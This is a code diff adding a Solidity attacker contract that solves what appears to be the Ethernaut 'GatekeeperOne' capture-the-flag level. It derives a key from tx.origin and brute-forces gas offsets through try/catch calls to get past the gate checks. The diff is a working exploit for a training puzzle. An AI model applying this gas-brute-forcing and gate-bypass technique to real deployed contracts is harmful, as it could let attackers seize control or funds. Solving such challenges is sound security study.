@@ -1,6 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "hardhat/console.sol";
+
+contract TheOtherMe {
+    GatekeeperOne gatekeeperOne;
+
+    constructor(address _address) {
+        gatekeeperOne = GatekeeperOne(_address);
+    }
+
+    function callEnter() external returns (bool) {
+        uint16 tmpKey = uint16(uint160(tx.origin));
+        uint64 key = tmpKey + 8589934592; // 2^33
+
+        for (uint i = 0; i < 8191; i++) {
+            try gatekeeperOne.enter{gas: 30000 + i}(bytes8(key)) returns (
+                bool succ
+            ) {
+                if (succ) {
+                    return succ;
+                }
+            } catch {}
+        }
+        return false;
+    }
+}
+
 contract GatekeeperOne {
     address public entrant;
 
